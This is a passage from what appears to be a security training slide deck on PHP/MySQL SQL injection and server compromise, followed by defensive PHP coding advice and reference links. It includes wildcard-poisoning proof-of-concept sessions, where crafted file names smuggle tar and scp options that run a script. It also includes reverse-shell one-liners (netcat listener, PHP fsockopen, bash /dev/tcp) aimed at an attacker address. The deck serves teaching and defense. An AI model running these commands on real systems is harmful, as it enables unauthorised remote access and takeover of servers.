        echo "Sorry, there was an error uploading your file." ;
    }
}
Social Engineering Trap
If all else fails and the attacker may have write permission on a server 
they could possible attack the server via social engineering with some 
careful crafted file names. 
Wildcard code execution as a trap. 
●
File names in a wild card expression are interpreted as command 
variables.
●
Create file names a commands so when user executes a wildcard 
command it runs file names a command options. 
●
They could fill the disk space on /var/log/mysql path.  Which would 
cause the system administrator to respond and execute commands in 
that directory.
○
http://www.defensecode.
com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
Wild Card Poisoning POC
Before we create wildcard name
[root@Dib test]# ls
file  file2  file3  file4  file5
[root@Dib test]# ls -l
total 0
-rw-r--r--. 1 root root 0 Oct  6 21:29 file
-rw-r--r--. 1 root root 0 Oct  6 21:29 file2
-rw-r--r--. 1 root root 0 Oct  6 21:29 file3
[root@Dib test]# ls *
file  file2  file3  file4  file5
After we create the called “-l”
[root@Dib test]# echo "" >> -l
[root@Dib test]# ls
file  file2  file3  file4  file5  -l
[root@Dib test]# ls *
-rw-r--r--. 1 root root 0 Oct  6 21:29 file
-rw-r--r--. 1 root root 0 Oct  6 21:29 file2
-rw-r--r--. 1 root root 0 Oct  6 21:29 file3
-rw-r--r--. 1 root root 0 Oct  6 21:29 file4
-rw-r--r--. 1 root root 0 Oct  6 21:29 file5
WCP Example 1 Tar
[root@wcp_poc]# echo "" > "--
checkpoint-action=exec=sh fix.sh"
[root@wcp_poc]# echo "" >  --
checkpoint=1
#fix.sh
#!/bin/bash
chmod 777 -R /var/www/
[root@wcp_poc]# ls --checkpoint-
action=exec=sh fix.sh  file2  file4  fix.
sh
--checkpoint=1  file1                              
file3  file5  stuff
# before
[root@wcp_poc]# ls -lah /var/www/
total 8.0K
drw-rw----.  2 root root 4.0K Oct  7 03:
35 .
[root@wcp_poc]# tar cf backup.tar *
# after
[root@wcp_poc]# ls -lah /var/www/
total 8.0K
drwxrwxrwx.  2 root root 4.0K Oct  7 
03:35 .
From : http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt
WCP Example 2 SCP
 [root@wcp_poc2]# ls
file1  
file2  
file3  
file4  
file5  
s.sh 
 -o  ProxyCommand sh s.sh  
zzz.txt
#before
 [root@wcp_poc2]# ls -lah /var/www/
total 8.0K
drw-rw----.  2 root root 4.0K Oct  7 03:
35 .
root@wcp_poc2]# scp * test@192.
168.122.64:~/
#after
 [root@wcp_poc2]# ls -lah /var/www/
total 8.0K
drwxrwxrwx.  2 root root 4.0K Oct  7 
03:35 .
From : https://dicesoft.net/projects/wildcard-code-execution-exploit.htm
Reverse Shell Call Backs
Taking advantage of the Wild Card Poisoning the attacker 
can craft a reverse shell using the Linux server 
environment.  
A reverse shell works by having the target system call back 
to a server controlled by the attacker. 
By simply leaving a couple of well crafted files named to 
run remote code the attacker might be able to trick the 
system admin into giving them a shell.
More on backdoors http://www.introtobackdoors.com/
Using a reverse shell the attacker can have the web server connect back 
to a vps they have access to some where on the internet. 
a example Net Cat listener to receive shells and ran on the attackers 
remote server.
●
nc -l -p 8080  
PHP Reverse Shell Run on target
●
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh 
-i &3 2>&3");'
OR Bash Reverse Shell.
●
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
Conclusion
So through the use of some simple web requests our 
attacker has gained remote code execution and at this 
point effectively owns the system. 
Although the attacker doesn’t have root access they can 
still gain value out of this compromised box by using it as a 
pivot point for attacks on other system or as a launch point 
for malicious code. 
Attack Recap
● SQL injection leads to data loss.
● Don't create world readable file on a web server.
● Don’t run the MySQL process as root or the www-data 
user. 
● On suspected compromised systems change MySQL 
users passwords.
● Attackers may have a list of system users by 
downloading a copy of /etc/passwd.
● Attackers may have access to source code.
● Restrict MySQL user permissions to limit attackers.
● Look for odd file names in MySQL directories and the 
tmp directory.
● Look in upload directories for pivote code. 
ATTR_EMULATE_PREPARES 
Note that when using PDO to connect to a MySQL database real prepared 
statements are not used by default. To enable them you have to turn of the 
emulation of prepared statements.
Real prepared statements have the database build the query with the 
parameters instead of building the query with the parameters and then sending 
it to the database.
    $dbh->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
More Info can be found here
http://stackoverflow.com/questions/134099/are-pdo-prepared-statements-
sufficient-to-prevent-sql-injection
mysql_real_escape_string()
An obscure bug exists in the way php handles the character set used on the 
database charset.
“ The C API call to mysql_real_escape_string() differs from addslashes() in that 
it knows the connection character set. So it can perform the escaping properly 
for the character set that the server is expecting. However, up to this point, the 
client thinks that we're still using latin1 for the connection, because we never 
told it otherwise. We did tell the server we're using gbk, but the client still thinks 
it's latin1. Therefore the call to mysql_real_escape_string() inserts the 
backslash, and we have a free hanging ' character in our "escaped" content! ” - 
IRCMAXWELL (http://stackoverflow.com/users/338665/ircmaxell)
http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-
mysql-real-escape-string/12118602#12118602
Secure Coding Example 
setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $dbh->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
}catch(PDOException $e){
    echo $e->getMessage(); 
}
$stmt = $dbh->prepare("SELECT * FROM orders where orderNumber = :id");
print_r($_GET);
if(isset($_GET['id']) && filter_var($_GET['id'], FILTER_VALIDATE_INT) === 1 ){
    $stmt->bindParam(':id', $_GET['id'], PDO::PARAM_INT);
    $stmt->execute();
    while($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        echo htmlspecialchars(print_r($row));
    }   
}else{
    echo "Invalid input";
}
$dbh =null;
?>
MySQL Users Permissions
To help mitigate attacks its important to create a MySQL 
user for each area of the database and each query type.
● So a user for SELECT
● One for UPDATE
● One for INSERT
● Avoid using DELETE if you can, but if you have to use it 
create a user that only has delete on the resource its 
required on. Instead of using DELETE Consider 
marking data as disabled and just hiding it from the 
user, unless of course its sensitive data and you’ve 
informed the user you have purged them from your 
system. 
Doing this will make SQLi difficult and isolated.
Whats Next
 Alot of the research into SQL Injection testing and exploitation has been built 
into sqlmap.
“Sqlmap is an open source penetration testing tool that automates the process 
of detecting and exploiting SQL injection flaws and taking over of database 
servers. It comes with a powerful detection engine, many niche features for the 
ultimate penetration tester and a broad range of switches lasting from database 
fingerprinting, over data fetching from the database, to accessing the 
underlying file system and executing commands on the operating system via 
out-of-band connections.” - SQLMap.org
http://sqlmap.org/ 
https://github.com/sqlmapproject/sqlmap/wiki/Usage
Appendix A SQL Injection Resources
● http://websec.ca/kb/sql_injection
● http://www.blackhat.com/presentations/bh-usa-
09/DZULFAKAR/BHUSA09-Dzulfakar-MySQLExploit-
PAPER.pdf
● http://www.thisislegal.com/tutorials/18://www.thisislegal.
com/tutorials/18
● http://www.grayscale-research.
org/new/pdfs/SQLInjectionPresentation.pdf
Appendix B Privilege Escalation 
Privilege escalation is the act of exploiting a bug, design 
flaw or configuration oversight in an operating system or 
software application to gain elevated access to resources 
that are normally protected from an application or user.
- en.wikipedia.org/wiki/Privilege_escalation
How to’s
● http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-
escalation/
● http://www.admin-magazine.
com/Articles/Understanding-Privilege-Escalation
● http://pwnwiki.io/#!privesc/linux/index.md
Appendix C PHP Secure Coding
Filter input using php filter_input  and use PHP MySQL 
PDO driver when possible or a php framework. 
●
http://www.phpro.org/tutorials/Introduction-to-PHP-PDO.html
●
http://php.net/manual/en/security.database.sql-injection.php
●
http://www.wikihow.com/Prevent-SQL-Injection-in-PHP
Input Validation
●
http://php.net/manual/en/function.filter-input.php
●
http://www.w3schools.com/php/php_form_validation.asp
●
http://www.phpro.org/tutorials/Validating-User-Input.html
Appendix D User Defined Functions
A more advanced attack against a MySQL database uses MySQL User Defined 
Function (UDF) to gain shell and root access. SQL Map has a UDF function 
which requires query stacking. 
●
http://nsimattstiles.wordpress.com/2014/07/11/gaining-a-root-shell-using-
mysql-user-defined-functions-and-setuid-binaries/
●
http://www.iodigitalsec.com/mysql-root-to-system-root-with-udf-for-
windows-and-linux/
●
https://www.defcon.org/images/defcon-17/dc-17-presentations/defcon-17-
muhaimin_dzulfakar-adv_mysql.pdf
●
https://github.com/sqlmapproject/sqlmap/blob/master/lib/takeover/udf.py
●
http://stackoverflow.com/questions/23707101/using-a-udf-mysql-query-
from-php
●
http://www.exploit-db.com/exploits/7856/
Appendix E PHP Security Guides
●
https://www.owasp.org/index.php/PHP_Security_Cheat_Sheet
●
http://phpsec.org/projects/guide/
●
http://www.madirish.net/199
●
https://www.idontplaydarts.com/2011/02/hardening-and-securing-php-on-
linux/
●
http://joind.in/talk/view/13949 -  Hardening the LAMP stack.
●
http://blog.up-link.ro/php-security-tips-securing-php-by-hardening-php-
configuration/
●
http://eddmann.com/posts/securing-sessions-in-php/
●
https://www.owasp.org/index.php/PHP_CSRF_Guard
●
http://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-
128/PHP-PHP.html
Appendix F Code Review Analysis 
RIPS is a static source code analyser for 
vulnerabilities in PHP web applications. 
● http://sourceforge.net/projects/rips-scanner/
● http://pen-testing.sans.org/blog/pen-
testing/2012/06/04/tips-for-pen-testers-on-
exploiting-the-php-remote-execution-
vulnerability
Credits
Icons From Icon Archive
● http://www.iconarchive.com/
Background from Chip Wires PPT 
● http://www.ppt-backgrounds.
net/technology/854-chip-wires-ppt-
backgrounds